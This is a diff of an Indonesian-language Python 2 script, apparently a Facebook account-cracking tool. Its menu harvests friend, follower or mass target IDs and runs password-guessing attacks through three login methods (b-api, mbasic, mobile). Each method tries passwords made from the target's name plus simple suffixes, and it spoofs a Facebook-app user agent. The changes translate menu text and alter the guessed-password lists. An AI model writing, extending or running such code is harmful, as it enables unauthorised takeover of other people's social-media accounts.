@@ -97,7 +97,7 @@ def menu():
 		exit(" ! token kadaluwarsa")
 	except requests.exceptions.ConnectionError:
 		exit(" ! tidak ada koneksi internet")
-reload(sys)
+	reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
@@ -105,8 +105,8 @@ os.system('clear')
 ##### LOGO #####
 logo='''
 
-		
-  oooooooooo.  oooooooooo.   ooooo     ooo ooooo             
+
+o.       oooooooooo.  oooooooooo.   ooooo     ooo ooooo             
      .888.      `888'   `Y8b `888'   `Y8b  `888'     `8' `888'             
     .8"888.      888     888  888      888  888       8   888              
    .8' `888.     888oooo888'  888      888  888       8   888              
@@ -123,17 +123,19 @@ oooooo   oooooo     oooo       .o.       ooooo   ooooo ooooo oooooooooo.
     `888.8'  `888.8'       .88ooo8888.    888     888   888   888      888 
      `888'    `888'       .8'     `888.   888     888   888   888     d88' 
       `8'      `8'       o88o     o8888o o888o   o888o o888o o888bood8P
-      
-      
+
+
+
+
 
 
 
 	print(" [ selamat datang \033[0;93m%s\033[0;97m ]\n"%(nama))
-	print(" 1 crack From public Friends")
-	print(" 2 crack From public")
-	print(" 3 crack From Group members")
-	print(" 4 check result crack")
-	print(" 5 Get user agent")
+	print(" 1 crack dari publik teman")
+	print(" 2 crack dari pengikut")
+	print(" 3 crack dari target massal")
+	print(" 4 lihat hasil crack")
+	print(" 5 ganti user agent")
 	print(" 0 keluar (hapus token)")
 	angga = raw_input("\n ? choose : ")
 	if angga =="":
@@ -149,13 +151,13 @@ oooooo   oooooo     oooo       .o.       ooooo   ooooo ooooo oooooooooo.
 		method()
 	elif angga == "4" or angga == "04":
 		print("\n 1 cek hasil crack OK")
-		print(" 2 cek use crack CP")
+		print(" 2 cek hasil crack CP")
 		cek = raw_input("\n ? choose : ")
 		if cek =="":
 			menu()
 		elif cek == "1":
 			dirs = os.listdir("OK")
-			print(" * list name file tersimpan di folder OK")
+			print(" * list nama file tersimpan di folder OK")
 			for file in dirs:
 				print(" + "+file)
 			try:
@@ -256,11 +258,12 @@ def massal():
 		except KeyError:
 			print(" ! akun tidak tersedia atau list teman private")
 	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id)))
+
 def method():
 	print(" \n [ pilih method crack - coba method satu² ]\n")
-	print(" 1 method b-api  (m Facebook crack)")
-	print(" 2 method mbasic (m Facebook slow crack)")
-	print(" 3 method mobile (free Facebookcrack)")
+	print(" 1 method b-api  (fast crack)")
+	print(" 2 method mbasic (slow crack)")
+	print(" 3 method mobile (slow crack)")
 	method = raw_input("\n ? method : ")
 	if method == "":
 		menu()
@@ -314,7 +317,7 @@ def bapi(user):
 	try:
 		ua = open(".ua", "r").read()
 	except IOError:
-		ua = ("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36;]")
+		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global loop, token
 	sys.stdout.write(
 		"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
@@ -327,7 +330,7 @@ def bapi(user):
 	elif len(name)<=3:
 		pwx = [ name+"123", name+"12345" ]
 	else:
-		pwx = [ name+"786", name+"123456" ]
+		pwx = [ name+"123", name+"12345" ]
 	try:
 		for pw in pwx:
 			pw = pw.lower()
@@ -368,7 +371,7 @@ def mbasic(user):
 	elif len(name)<=3:
 		pwx = [ name+"123", name+"12345" ]
 	else:
-		pwx = [ name+"786", name+"123456" ]
+		pwx = [ name+"123", name+"12345" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
@@ -420,7 +423,7 @@ def mobile(user):
 	elif len(name)<=3:
 		pwx = [ name+"123", name+"12345" ]
 	else:
-		pwx = [ name+"786", name+"123456" ]
+		pwx = [ name+"123", name+"12345" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
